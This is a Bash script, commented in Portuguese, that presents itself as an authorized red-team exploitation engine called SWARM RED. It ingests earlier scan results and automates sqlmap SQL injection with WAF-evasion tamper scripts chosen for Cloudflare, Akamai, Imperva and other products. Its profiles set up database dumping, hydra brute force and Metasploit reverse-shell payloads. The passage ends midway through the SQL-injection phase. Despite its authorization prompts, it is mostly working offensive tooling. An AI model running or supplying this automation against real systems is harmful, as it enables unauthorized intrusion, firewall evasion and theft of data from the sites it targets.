#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
#  SWARM RED — Automated Exploitation Engine
# ═══════════════════════════════════════════════════════════════════════════════
#  Consome resultados do SWARM (scan) e executa exploração automatizada.
#
#  Pipeline:   SWARM (recon + vuln scan) → SWARM RED (exploitation)
#
#  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS E CONTROLADOS.
#  Requer: Rules of Engagement (RoE) assinado + janela de teste aprovada.
#
#  Uso:
#    bash swarm_red.sh -d <scan_dir>                    # Dir do SWARM
#    bash swarm_red.sh -d <scan_dir> -p <profile>       # Com perfil
#    bash swarm_red.sh -d <scan_dir> --dry-run           # Simular apenas
#    bash swarm_red.sh -t <target> --standalone           # Sem SWARM prévio
#
#  Perfis:     staging | lab | production
#  Operadores: Red Team (com RoE documentado)
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

# ═══════════════════════════════════════════════════════════════════════════════
#  PATHS — resolver localização dos módulos Python (com auto-bootstrap)
# ═══════════════════════════════════════════════════════════════════════════════
_resolve_script_dir() {
    local source="${BASH_SOURCE[0]}"
    while [ -L "$source" ]; do
        local dir
        dir="$(cd "$(dirname "$source")" && pwd)"
        source="$(readlink "$source")"
        [[ "$source" != /* ]] && source="$dir/$source"
    done
    echo "$(cd "$(dirname "$source")" && pwd)"
}

SCRIPT_DIR="$(_resolve_script_dir)"
LIB_DIR=""

_find_lib_dir() {
    local candidates=(
        "$SCRIPT_DIR/lib"
        "$(pwd)/lib"
        "$HOME/swarm-red/lib"
        "$HOME/swarm_red/lib"
        "$HOME/Downloads/swarm-red/lib"
        "/opt/swarm-red/lib"
    )
    for d in "${candidates[@]}"; do
        if [ -d "$d" ] && [ -f "$d/report_generator.py" ]; then
            echo "$d"
            return 0
        fi
    done
    return 1
}

_sync_lib() {
    # Sempre atualizar lib/ a partir dos módulos embutidos se o script for mais novo
    local lib_dir="$1"
    local script_path
    script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"

    # Comparar timestamp: script vs lib/parsers.py
    if [ -f "$lib_dir/parsers.py" ] && [ "$script_path" -nt "$lib_dir/parsers.py" ]; then
        echo -e "\033[1;33m[!]\033[0m Atualizando lib/ (script mais recente que módulos)..." >&2
        _extract_embedded "$lib_dir" "$script_path"
    fi
}

_extract_embedded() {
    local target_dir="$1"
    local script_path="$2"
    mkdir -p "$target_dir" 2>/dev/null || true

    for module in parsers evidence report_generator; do
        local start="^___EMBEDDED_${module}_START___$"
        local end="^___EMBEDDED_${module}_END___$"
        sed -n "/${start}/,/${end}/p" "$script_path" | sed '1d;$d' > "$target_dir/${module}.py"
    done
    local start="^___EMBEDDED_profiles_START___$"
    local end="^___EMBEDDED_profiles_END___$"
    sed -n "/${start}/,/${end}/p" "$script_path" | sed '1d;$d' > "$target_dir/profiles.conf"
}

_bootstrap_lib() {
    local target_dir="$SCRIPT_DIR/lib"
    echo -e "\033[1;33m[!]\033[0m lib/ não encontrado — extraindo módulos embutidos para $target_dir" >&2
    mkdir -p "$target_dir" 2>/dev/null || {
        target_dir="$(pwd)/lib"
        mkdir -p "$target_dir"
    }

    local script_path
    script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
    _extract_embedded "$target_dir" "$script_path"

    if [ -f "$target_dir/report_generator.py" ]; then
        echo -e "\033[0;32m[✓]\033[0m Módulos extraídos para $target_dir" >&2
        echo "$target_dir"
        return 0
    fi
    return 1
}

LIB_DIR="$(_find_lib_dir)" || LIB_DIR="$(_bootstrap_lib)" || {
    echo -e "\033[0;31m[✗] Falha ao localizar/criar lib/. Verifique permissões.\033[0m"
    exit 1
}

# Sempre sincronizar se o script for mais novo que os módulos
_sync_lib "$LIB_DIR"

# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTES E CORES
# ═══════════════════════════════════════════════════════════════════════════════
readonly VERSION="1.0.0"
readonly SCRIPT_NAME="SWARM RED"
readonly SCRIPT_START=$(date +%s)

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'
MAG='\033[0;35m'; BLD='\033[1m'; DIM='\033[2m'; RST='\033[0m'

# ═══════════════════════════════════════════════════════════════════════════════
#  SIGNAL HANDLING — Ctrl+C mata tudo limpo
# ═══════════════════════════════════════════════════════════════════════════════
CHILD_PIDS=()
ABORT=false

_cleanup_and_exit() {
    ABORT=true
    echo ""
    echo -e "  ${RED}${BLD}╔══════════════════════════════════════════════════════════╗${RST}"
    echo -e "  ${RED}${BLD}║           ⚠  ABORTADO PELO OPERADOR (Ctrl+C)           ║${RST}"
    echo -e "  ${RED}${BLD}╚══════════════════════════════════════════════════════════╝${RST}"
    echo ""

    # Matar todos os processos filhos
    local killed=0
    for pid in "${CHILD_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill -TERM "$pid" 2>/dev/null
            ((killed++))
        fi
    done

    # Matar processos por nome (fallback — pega filhos de timeout)
    for proc in sqlmap msfconsole hydra nikto; do
        pkill -f "$proc" 2>/dev/null && ((killed++)) || true
    done

    if [ "$killed" -gt 0 ]; then
        echo -e "  ${YLW}[!]${RST} $killed processo(s) filho(s) encerrado(s)"
    fi

    # Registrar no log
    if [ -n "${LOGFILE:-}" ] && [ -f "${LOGFILE:-/dev/null}" ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] ABORTADO pelo operador (SIGINT)" >> "$LOGFILE"
    fi

    # Gerar relatório parcial se temos output dir
    if [ -n "${OUTDIR:-}" ] && [ -d "${OUTDIR:-}" ]; then
        echo -e "  ${YLW}[!]${RST} Gerando relatório parcial com dados coletados até aqui..."
        _generate_report 2>/dev/null || true
        echo -e "  ${CYN}Output parcial:${RST} $OUTDIR/"
        [ -f "$OUTDIR/relatorio_swarm_red.html" ] && \
            echo -e "  ${CYN}Relatório:${RST}     $OUTDIR/relatorio_swarm_red.html"
    fi

    echo ""
    echo -e "  ${DIM}Duração: $(elapsed)${RST}"
    echo ""
    exit 130
}

# Registrar trap para SIGINT (Ctrl+C) e SIGTERM
trap _cleanup_and_exit INT TERM

# Helper para rastrear PIDs de processos filhos
_track_pid() {
    CHILD_PIDS+=("$1")
}

# Helper para executar ferramenta com rastreamento de PID
_run_tool() {
    # Uso: _run_tool <timeout_secs> <log_file> <command...>
    local timeout_secs="$1"; shift
    local log_file="$1"; shift

    [ "$ABORT" = true ] && return 130

    timeout "$timeout_secs" "$@" \
        < /dev/null \
        > "$log_file" 2>&1 &
    local pid=$!
    _track_pid "$pid"

    # Esperar o processo, verificando abort periodicamente
    while kill -0 "$pid" 2>/dev/null; do
        if [ "$ABORT" = true ]; then
            kill -TERM "$pid" 2>/dev/null
            wait "$pid" 2>/dev/null
            return 130
        fi
        wait -n "$pid" 2>/dev/null && break || true
        sleep 1
    done

    wait "$pid" 2>/dev/null
    return $?
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PERFIS DE EXECUÇÃO (carregados de lib/profiles.conf)
# ═══════════════════════════════════════════════════════════════════════════════

declare -A PROFILE_SQLMAP_LEVEL PROFILE_SQLMAP_RISK PROFILE_SQLMAP_THREADS
declare -A PROFILE_SQLMAP_DUMP PROFILE_MSF_PAYLOAD PROFILE_BRUTE_FORCE
declare -A PROFILE_NIKTO_ENABLED PROFILE_MAX_EXPLOITS PROFILE_DESCRIPTION
declare -A PROFILE_TIMEOUT_SQLMAP_CRAWL PROFILE_TIMEOUT_SQLMAP_URL
declare -A PROFILE_TIMEOUT_MSF PROFILE_TIMEOUT_HYDRA PROFILE_TIMEOUT_NIKTO

if [ -f "$LIB_DIR/profiles.conf" ]; then
    source "$LIB_DIR/profiles.conf"
else
    # Fallback inline (caso profiles.conf não exista)
    PROFILE_DESCRIPTION[staging]="Staging/Homolog — agressividade alta, dump habilitado"
    PROFILE_DESCRIPTION[lab]="Lab/Sandbox — sem restrições, ambiente descartável"
    PROFILE_DESCRIPTION[production]="Produção (janela aprovada) — mínimo impacto, só confirmação"
    PROFILE_SQLMAP_LEVEL[staging]=3;   PROFILE_SQLMAP_LEVEL[lab]=5;    PROFILE_SQLMAP_LEVEL[production]=1
    PROFILE_SQLMAP_RISK[staging]=2;    PROFILE_SQLMAP_RISK[lab]=3;     PROFILE_SQLMAP_RISK[production]=1
    PROFILE_SQLMAP_THREADS[staging]=5; PROFILE_SQLMAP_THREADS[lab]=10; PROFILE_SQLMAP_THREADS[production]=1
    PROFILE_SQLMAP_DUMP[staging]=true; PROFILE_SQLMAP_DUMP[lab]=true;  PROFILE_SQLMAP_DUMP[production]=false
    PROFILE_MSF_PAYLOAD[staging]="generic/shell_reverse_tcp"
    PROFILE_MSF_PAYLOAD[lab]="generic/shell_reverse_tcp"
    PROFILE_MSF_PAYLOAD[production]="NONE"
    PROFILE_BRUTE_FORCE[staging]=true;  PROFILE_BRUTE_FORCE[lab]=true;  PROFILE_BRUTE_FORCE[production]=false
    PROFILE_NIKTO_ENABLED[staging]=true; PROFILE_NIKTO_ENABLED[lab]=true; PROFILE_NIKTO_ENABLED[production]=false
    PROFILE_MAX_EXPLOITS[staging]=50;  PROFILE_MAX_EXPLOITS[lab]=999;  PROFILE_MAX_EXPLOITS[production]=10
    PROFILE_TIMEOUT_SQLMAP_CRAWL[staging]=900;  PROFILE_TIMEOUT_SQLMAP_CRAWL[lab]=1800; PROFILE_TIMEOUT_SQLMAP_CRAWL[production]=300
    PROFILE_TIMEOUT_SQLMAP_URL[staging]=300;    PROFILE_TIMEOUT_SQLMAP_URL[lab]=600;    PROFILE_TIMEOUT_SQLMAP_URL[production]=120
    PROFILE_TIMEOUT_MSF[staging]=1800;          PROFILE_TIMEOUT_MSF[lab]=3600;          PROFILE_TIMEOUT_MSF[production]=600
    PROFILE_TIMEOUT_HYDRA[staging]=300;         PROFILE_TIMEOUT_HYDRA[lab]=600;         PROFILE_TIMEOUT_HYDRA[production]=120
    PROFILE_TIMEOUT_NIKTO[staging]=700;         PROFILE_TIMEOUT_NIKTO[lab]=1200;        PROFILE_TIMEOUT_NIKTO[production]=300
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  VARIÁVEIS GLOBAIS
# ═══════════════════════════════════════════════════════════════════════════════
SCAN_DIR=""
TARGET=""
PROFILE="staging"
DRY_RUN=false
STANDALONE=false
OUTDIR=""
LOGFILE=""
LHOST=""
LPORT="4444"
ROE_CONFIRMED=false
VENV_PYTHON="$HOME/.swarm-red-venv/bin/python3"
WAF_DETECTED="none"

# Contadores
TOTAL_EXPLOITS=0
SUCCESSFUL_EXPLOITS=0
FAILED_EXPLOITS=0

# ═══════════════════════════════════════════════════════════════════════════════
#  FUNÇÕES UTILITÁRIAS
# ═══════════════════════════════════════════════════════════════════════════════
banner() {
    echo -e "${RED}"
    cat << 'EOF'
   _____ _       _____    ____  __  ___   ____  __________
  / ___/| |     / /   |  / __ \/  |/  /  / __ \/ ____/ __ \
  \__ \ | | /| / / /| | / /_/ / /|_/ /  / /_/ / __/ / / / /
 ___/ / | |/ |/ / ___ |/ _, _/ /  / /  / _, _/ /___/ /_/ /
/____/  |__/|__/_/  |_/_/ |_/_/  /_/  /_/ |_/_____/_____/
EOF
    echo -e "${RST}"
    echo -e "  ${DIM}v${VERSION} — Automated Exploitation Engine${RST}"
    echo -e "  ${RED}⚠  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS${RST}"
    echo ""
}

info()    { echo -e "  ${GRN}[✓]${RST} $*" | tee -a "$LOGFILE"; }
warn()    { echo -e "  ${YLW}[!]${RST} $*" | tee -a "$LOGFILE"; }
fail()    { echo -e "  ${RED}[✗]${RST} $*" | tee -a "$LOGFILE"; }
phase()   { echo -e "\n${CYN}════════════════════════════════════════════════════════════════${RST}" | tee -a "$LOGFILE"
            echo -e "  ${CYN}$*${RST}" | tee -a "$LOGFILE"
            echo -e "${CYN}════════════════════════════════════════════════════════════════${RST}" | tee -a "$LOGFILE"; }
has()     { command -v "$1" &>/dev/null; }
ts()      { date '+%Y-%m-%d %H:%M:%S'; }

log_cmd() {
    # Loga o comando no activity log antes de executar
    echo "[$(ts)] CMD: $*" >> "$LOGFILE"
}

elapsed() {
    local end=$(date +%s)
    local dur=$((end - SCRIPT_START))
    printf '%02d:%02d:%02d' $((dur/3600)) $(((dur%3600)/60)) $((dur%60))
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PATH — RESOLVER FERRAMENTAS EM SUBSHELL
# ═══════════════════════════════════════════════════════════════════════════════
setup_path() {
    local extra_paths=(
        "$HOME/go/bin"
        "/root/go/bin"
        "$HOME/.local/bin"
        "/opt/metasploit-framework/bin"
        "/usr/share/metasploit-framework"
        "/opt/sqlmap"
    )
    for p in "${extra_paths[@]}"; do
        [ -d "$p" ] && [[ ":$PATH:" != *":$p:"* ]] && export PATH="$p:$PATH"
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
#  VALIDAÇÃO DE FERRAMENTAS
# ═══════════════════════════════════════════════════════════════════════════════
validate_tools() {
    phase "VALIDAÇÃO DE FERRAMENTAS"

    local required=(bash python3 curl)
    local optional=(msfconsole sqlmap nmap hydra nikto searchsploit jq)
    local missing_req=0

    for tool in "${required[@]}"; do
        if has "$tool"; then
            info "$tool encontrado → $(which "$tool")"
        else
            fail "$tool NÃO ENCONTRADO (obrigatório)"
            ((missing_req++))
        fi
    done

    for tool in "${optional[@]}"; do
        if has "$tool"; then
            info "$tool encontrado → $(which "$tool")"
        else
            warn "$tool não encontrado (funcionalidade será desabilitada)"
        fi
    done

    # Python venv
    if [ -f "$VENV_PYTHON" ]; then
        info "Python venv → $VENV_PYTHON"
    else
        warn "Venv não encontrado — usando python3 do sistema"
        VENV_PYTHON="python3"
    fi

    if [ "$missing_req" -gt 0 ]; then
        fail "Ferramentas obrigatórias faltando. Execute: bash setup.sh"
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIRMAÇÃO ROE (RULES OF ENGAGEMENT)
# ═══════════════════════════════════════════════════════════════════════════════
confirm_roe() {
    phase "CONFIRMAÇÃO DE AUTORIZAÇÃO"

    echo -e "  ${RED}${BLD}╔══════════════════════════════════════════════════════════╗${RST}"
    echo -e "  ${RED}${BLD}║              ⚠  AVISO DE AUTORIZAÇÃO  ⚠                ║${RST}"
    echo -e "  ${RED}${BLD}╠══════════════════════════════════════════════════════════╣${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}║  Este script executa EXPLORAÇÃO ATIVA incluindo:       ║${RST}"
    echo -e "  ${RED}${BLD}║  • SQL Injection (sqlmap modo agressivo)               ║${RST}"
    echo -e "  ${RED}${BLD}║  • Exploits Metasploit com payloads ativos             ║${RST}"
    echo -e "  ${RED}${BLD}║  • Brute force de credenciais (hydra)                  ║${RST}"
    echo -e "  ${RED}${BLD}║  • Scan ativo de vulnerabilidades (nikto)              ║${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}║  USO SEM AUTORIZAÇÃO É CRIME (Art. 154-A CP).         ║${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}╚══════════════════════════════════════════════════════════╝${RST}"
    echo ""
    echo -e "  ${YLW}Perfil:${RST}     ${PROFILE} — ${PROFILE_DESCRIPTION[$PROFILE]}"
    echo -e "  ${YLW}Alvo:${RST}       ${TARGET:-$SCAN_DIR}"
    echo -e "  ${YLW}Dry-run:${RST}    ${DRY_RUN}"
    echo ""

    if [ "$DRY_RUN" = true ]; then
        warn "Modo DRY-RUN ativo — nenhum exploit será executado de fato"
        ROE_CONFIRMED=true
        return 0
    fi

    echo -e "  ${BLD}Confirme digitando exatamente:${RST} ${RED}EU AUTORIZO${RST}"
    if [ -t 0 ]; then
        read -rp "  > " confirmation < /dev/tty
    else
        read -rp "  > " confirmation
    fi

    if [ "$confirmation" = "EU AUTORIZO" ]; then
        ROE_CONFIRMED=true
        info "Autorização confirmada por: $(whoami)@$(hostname) em $(ts)"
        echo "[$(ts)] ROE CONFIRMADO por $(whoami)@$(hostname)" >> "$LOGFILE"
    else
        fail "Autorização não confirmada. Abortando."
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PARSER DE RESULTADOS DO SWARM
# ═══════════════════════════════════════════════════════════════════════════════
parse_swarm_results() {
    phase "FASE 1/6: INGESTÃO DE RESULTADOS SWARM"

    # Criar OUTDIR temporário para ingestão (será renomeado no main)
    _TEMP_OUTDIR=$(mktemp -d "./swarm_red_tmp_XXXXXX")
    OUTDIR="$_TEMP_OUTDIR"
    mkdir -p "$OUTDIR"/{sqlmap,metasploit,hydra,nikto,searchsploit}
    echo "status|target|tool|detail" > "$OUTDIR/exploits_confirmed.csv"
    echo "status|target|tool|detail" > "$OUTDIR/exploits_attempted.csv"

    if [ "$STANDALONE" = true ]; then
        warn "Modo standalone — sem resultados SWARM prévios"
        info "Alvo: $TARGET"
        return 0
    fi

    if [ ! -d "$SCAN_DIR" ]; then
        fail "Diretório do SWARM não encontrado: $SCAN_DIR"
        exit 1
    fi

    local raw_dir="$SCAN_DIR/raw"
    if [ ! -d "$raw_dir" ]; then
        # Tentar encontrar subdir raw dentro do scan dir
        raw_dir=$(find "$SCAN_DIR" -name "raw" -type d 2>/dev/null | head -1)
        if [ -z "$raw_dir" ]; then
            fail "Diretório raw/ não encontrado em $SCAN_DIR"
            exit 1
        fi
    fi

    info "Diretório SWARM: $SCAN_DIR"
    info "Raw data: $raw_dir"

    # ── Extrair TARGET do SWARM ──
    if [ -z "$TARGET" ]; then
        # Tentar extrair do nome do diretório (scan_DOMAIN_DATE)
        TARGET=$(basename "$SCAN_DIR" | sed -E 's/^scan_//;s/_[0-9]{8}_[0-9]{6}$//')
        if [ -z "$TARGET" ] || [ "$TARGET" = "$(basename "$SCAN_DIR")" ]; then
            fail "Não consegui extrair o alvo do diretório. Use -t <target>"
            exit 1
        fi
    fi
    info "Alvo: $TARGET"

    # ── Parse Nuclei results ──
    local nuclei_json="$raw_dir/nuclei.json"
    local nuclei_jsonl="$raw_dir/nuclei_results.jsonl"
    local nuclei_file=""

    if [ -f "$nuclei_json" ]; then
        nuclei_file="$nuclei_json"
    elif [ -f "$nuclei_jsonl" ]; then
        nuclei_file="$nuclei_jsonl"
    fi

    if [ -n "$nuclei_file" ] && [ -s "$nuclei_file" ]; then
        local nuclei_count
        nuclei_count=$(wc -l < "$nuclei_file")
        info "Nuclei findings: $nuclei_count"
        cp "$nuclei_file" "$OUTDIR/input_nuclei.jsonl"

        # Extrair CVEs, URLs com parâmetros, e todas URLs
        $VENV_PYTHON "$LIB_DIR/parsers.py" parse_nuclei "$nuclei_file" "$OUTDIR"

        local cve_count
        cve_count=$(wc -l < "$OUTDIR/cves_found.txt" 2>/dev/null || echo "0")
        info "CVEs extraídos: $cve_count"
    else
        warn "Sem resultados Nuclei — módulo SQLi rodará em modo discovery"
    fi

    # ── Parse Nmap results ──
    local nmap_file="$raw_dir/nmap.txt"
    if [ -f "$nmap_file" ] && [ -s "$nmap_file" ]; then
        info "Nmap results encontrados"
        cp "$nmap_file" "$OUTDIR/input_nmap.txt"

        # Extrair portas abertas e serviços
        grep -E '^[0-9]+/(tcp|udp)' "$nmap_file" 2>/dev/null \
            | awk '{print $1, $3, $4}' > "$OUTDIR/open_services.txt" || true
        local svc_count
        svc_count=$(wc -l < "$OUTDIR/open_services.txt" 2>/dev/null || echo "0")
        info "Serviços abertos: $svc_count"
    fi

    # ── Parse ZAP results ──
    local zap_json="$raw_dir/zap_alerts.json"
    if [ -f "$zap_json" ] && [ -s "$zap_json" ]; then
        info "ZAP alerts encontrados"
        cp "$zap_json" "$OUTDIR/input_zap.json"

        # Extrair alertas de SQLi e High/Critical do ZAP
        $VENV_PYTHON "$LIB_DIR/parsers.py" parse_zap "$zap_json" "$OUTDIR"
    fi

    # ── Parse testssl results ──
    local testssl_json="$raw_dir/testssl.json"
    if [ -f "$testssl_json" ] && [ -s "$testssl_json" ]; then
        info "testssl results encontrados"
        cp "$testssl_json" "$OUTDIR/input_testssl.json"
    fi

    # ── Parse httpx results ──
    local httpx_file="$raw_dir/httpx_results.txt"
    local httpx_jsonl="$raw_dir/httpx.jsonl"
    if [ -f "$httpx_jsonl" ] && [ -s "$httpx_jsonl" ]; then
        info "httpx results encontrados"
        cp "$httpx_jsonl" "$OUTDIR/input_httpx.jsonl"
    elif [ -f "$httpx_file" ] && [ -s "$httpx_file" ]; then
        info "httpx results encontrados"
        cp "$httpx_file" "$OUTDIR/input_httpx.txt"
    fi

    # ── Parse exploit confirmations (SWARM já confirmou!) ──
    local confirm_json="$raw_dir/exploit_confirmations.json"
    if [ -f "$confirm_json" ] && [ -s "$confirm_json" ]; then
        local confirmed_count
        confirmed_count=$($VENV_PYTHON -c "
import json
data=json.load(open('$confirm_json'))
confirmed=[c for c in data if c.get('confirmed',False)]
print(len(confirmed))" 2>/dev/null || echo "0")
        info "Exploit confirmations do SWARM: $confirmed_count confirmado(s)"
        cp "$confirm_json" "$OUTDIR/input_exploit_confirmations.json"
    fi

    # ── Parse Katana URLs (crawler) ──
    local katana_file="$raw_dir/katana_urls.txt"
    if [ -f "$katana_file" ] && [ -s "$katana_file" ]; then
        local katana_count
        katana_count=$(wc -l < "$katana_file")
        info "Katana URLs: $katana_count URL(s) do crawler"
        cp "$katana_file" "$OUTDIR/input_katana_urls.txt"
    fi

    # ── Parse JS Analysis (endpoints + secrets) ──
    local js_json="$raw_dir/js_analysis.json"
    if [ -f "$js_json" ] && [ -s "$js_json" ]; then
        local js_ep js_sec
        js_ep=$($VENV_PYTHON -c "import json;d=json.load(open('$js_json'));print(len(d.get('endpoints',[])))" 2>/dev/null || echo "0")
        js_sec=$($VENV_PYTHON -c "import json;d=json.load(open('$js_json'));print(len(d.get('secrets',[])))" 2>/dev/null || echo "0")
        info "JS Analysis: $js_ep endpoint(s), $js_sec secret(s)"
        cp "$js_json" "$OUTDIR/input_js_analysis.json"
    fi

    # ── Parse KEV matches (CISA Known Exploited) ──
    local kev_json="$raw_dir/kev_matches.json"
    if [ -f "$kev_json" ] && [ -s "$kev_json" ]; then
        local kev_count
        kev_count=$($VENV_PYTHON -c "import json;print(len(json.load(open('$kev_json'))))" 2>/dev/null || echo "0")
        if [ "$kev_count" -gt 0 ]; then
            warn "🔴 $kev_count CVE(s) no catálogo KEV (CISA) — exploração ativa confirmada!"
        fi
        cp "$kev_json" "$OUTDIR/input_kev_matches.json"
    fi

    # ── Parse CVE enrichment (CVSS/EPSS) ──
    local cve_enrich="$raw_dir/cve_enrichment.json"
    if [ -f "$cve_enrich" ] && [ -s "$cve_enrich" ]; then
        info "CVE enrichment (CVSS/EPSS) encontrado"
        cp "$cve_enrich" "$OUTDIR/input_cve_enrichment.json"
    fi

    # ── Parse WAF detection ──
    local waf_json="$raw_dir/waf.json"
    local waf_name="$raw_dir/waf_name.txt"
    WAF_DETECTED="none"
    if [ -f "$waf_name" ] && [ -s "$waf_name" ]; then
        WAF_DETECTED=$(cat "$waf_name" | tr -d '\n')
        warn "WAF detectado: $WAF_DETECTED — tamper scripts serão ajustados"
    elif [ -f "$waf_json" ] && [ -s "$waf_json" ]; then
        WAF_DETECTED=$($VENV_PYTHON -c "
import json
d=json.load(open('$waf_json'))
wafs=[e.get('waf','') for e in (d if isinstance(d,list) else [d]) if e.get('detected',False)]
print(wafs[0] if wafs else 'none')" 2>/dev/null || echo "none")
        [ "$WAF_DETECTED" != "none" ] && warn "WAF detectado: $WAF_DETECTED"
    fi

    # ── Parse OpenAPI spec ──
    local openapi="$raw_dir/openapi_spec.json"
    if [ -f "$openapi" ] && [ -s "$openapi" ]; then
        info "OpenAPI spec encontrada"
        cp "$openapi" "$OUTDIR/input_openapi_spec.json"
    fi

    info "Ingestão completa"

    # ── Extrair TODAS as URLs com parâmetros de TODAS as fontes ──
    # Isto alimenta a fase de SQLi
    _extract_all_injectable_urls
}

_extract_all_injectable_urls() {
    info "Extraindo URLs injetáveis de todas as fontes..."

    $VENV_PYTHON "$LIB_DIR/parsers.py" extract_urls "$OUTDIR" "$TARGET"

    local param_count=0
    [ -f "$OUTDIR/urls_with_params.txt" ] && param_count=$(wc -l < "$OUTDIR/urls_with_params.txt")
    local total_count=0
    [ -f "$OUTDIR/all_target_urls.txt" ] && total_count=$(wc -l < "$OUTDIR/all_target_urls.txt")
    info "URLs coletadas: $total_count total, $param_count com parâmetros injetáveis"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 2: SQL INJECTION (sqlmap)
# ═══════════════════════════════════════════════════════════════════════════════
run_sqli_phase() {
    [ "$ABORT" = true ] && return 0
    phase "FASE 2/6: SQL INJECTION (sqlmap)"

    # Consolidar URLs candidatas para SQLi (sempre, mesmo sem sqlmap)
    mkdir -p "$OUTDIR/sqlmap"
    local sqli_urls="$OUTDIR/sqli_targets.txt"
    cat "$OUTDIR/urls_with_params.txt" \
        "$OUTDIR/zap_sqli_urls.txt" \
        2>/dev/null | sort -u > "$sqli_urls" || true

    local sqli_count=0
    [ -s "$sqli_urls" ] && sqli_count=$(wc -l < "$sqli_urls")
    info "URLs candidatas SQLi consolidadas: $sqli_count"

    if ! has sqlmap; then
        warn "sqlmap não encontrado — fase desabilitada"
        return 0
    fi

    local level="${PROFILE_SQLMAP_LEVEL[$PROFILE]}"
    local risk="${PROFILE_SQLMAP_RISK[$PROFILE]}"
    local threads="${PROFILE_SQLMAP_THREADS[$PROFILE]}"
    local dump="${PROFILE_SQLMAP_DUMP[$PROFILE]}"

    info "Perfil: level=$level risk=$risk threads=$threads dump=$dump"

    # Selecionar tamper scripts baseado no WAF detectado
    local tamper_scripts="space2comment,between"
    case "${WAF_DETECTED,,}" in
        *cloudflare*)  tamper_scripts="between,randomcase,space2comment,charunicodeencode" ;;
        *modsecurity*|*owasp*) tamper_scripts="space2morehash,between,percentage,charencode" ;;
        *aws*|*awswaf*|*cloudfront*) tamper_scripts="space2comment,between,randomcase,charunicodeencode" ;;
        *akamai*)      tamper_scripts="between,space2comment,charunicodeencode,randomcase" ;;
        *imperva*|*incapsula*) tamper_scripts="space2comment,between,charunicodeencode,equaltolike" ;;
        *f5*|*bigip*)  tamper_scripts="space2comment,between,percentage,charencode" ;;
        *fortinet*|*fortiweb*) tamper_scripts="space2comment,between,randomcase" ;;
        none|"")       tamper_scripts="space2comment,between" ;;
    esac
    [ "$WAF_DETECTED" != "none" ] && info "Tamper scripts para $WAF_DETECTED: $tamper_scripts"

    # Se não há URLs com parâmetros, fazer discovery próprio antes do crawl
    if [ ! -s "$sqli_urls" ]; then
        info "Sem URLs prévias — executando discovery + crawl completo"

        local crawl_target="https://${TARGET}"
        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] sqlmap -u $crawl_target --crawl=5 --forms --batch --level=$level --risk=$risk"
            return 0
        fi

        log_cmd "sqlmap discovery+crawl against $crawl_target"
        info "  Fase 2a: crawl + forms discovery (log em $OUTDIR/sqlmap/crawl_output.log)"

        # Crawl mais profundo (depth 5) + forms + cookie injection
        _run_tool 900 "$OUTDIR/sqlmap/crawl_output.log" \
            sqlmap \
            -u "$crawl_target" \
            --crawl=5 \
            --forms \
            --batch \
            --level="$level" \
            --risk="$risk" \
            --threads="$threads" \
            --output-dir="$OUTDIR/sqlmap" \
            --random-agent \
            --flush-session \
            --technique=BEUSTQ \
            --tamper="$tamper_scripts" \
            || true

        # Se temos all_target_urls.txt, testar as URLs base também
        if [ -f "$OUTDIR/all_target_urls.txt" ] && [ -s "$OUTDIR/all_target_urls.txt" ]; then
            local base_count
            base_count=$(wc -l < "$OUTDIR/all_target_urls.txt")
            info "  Fase 2b: testando $base_count URL(s) base do SWARM"

            local base_tested=0
            while IFS= read -r base_url; do
                [ -z "$base_url" ] && continue
                ((base_tested++))
                [ "$base_tested" -gt 10 ] && break  # Limitar a 10 URLs base

                local safe_name
                safe_name=$(echo "$base_url" | md5sum | cut -c1-8)

                _run_tool 180 "$OUTDIR/sqlmap/${safe_name}_output.log" \
                    sqlmap \
                    -u "$base_url" \
                    --crawl=2 \
                    --forms \
                    --batch \
                    --level="$level" \
                    --risk="$risk" \
                    --threads="$threads" \
                    --output-dir="$OUTDIR/sqlmap/$safe_name" \
                    --random-agent \
                    --flush-session \
                    || true

                if grep -qiE "(is vulnerable|injectable|payload|fetched)" "$OUTDIR/sqlmap/${safe_name}_output.log" 2>/dev/null; then
                    info "  ⚡ VULNERÁVEL: $base_url"
                    echo "VULNERABLE|$base_url|sqlmap|level=$level,risk=$risk" >> "$OUTDIR/exploits_confirmed.csv"
                    ((SUCCESSFUL_EXPLOITS++))
                fi
                ((TOTAL_EXPLOITS++))
            done < "$OUTDIR/all_target_urls.txt"
        fi

        _parse_sqlmap_results "$OUTDIR/sqlmap"
        info "SQLi fase completa (discovery + crawl)"
        return 0
    fi

    local url_count
    url_count=$(wc -l < "$sqli_urls")
    info "$url_count URL(s) candidata(s) para teste SQLi"

    local max="${PROFILE_MAX_EXPLOITS[$PROFILE]}"
    local tested=0

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        ((tested++))
        [ "$tested" -gt "$max" ] && { warn "Limite de $max testes atingido"; break; }

        local safe_name
        safe_name=$(echo "$url" | md5sum | cut -c1-8)

        info "[$tested/$url_count] Testando: $url"

        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] sqlmap -u '$url' --batch --level=$level --risk=$risk --threads=$threads"
            continue
        fi

        local sqlmap_args=(
            -u "$url"
            --batch
            --level="$level"
            --risk="$risk"
            --threads="$threads"
            --output-dir="$OUTDIR/sqlmap/$safe_name"
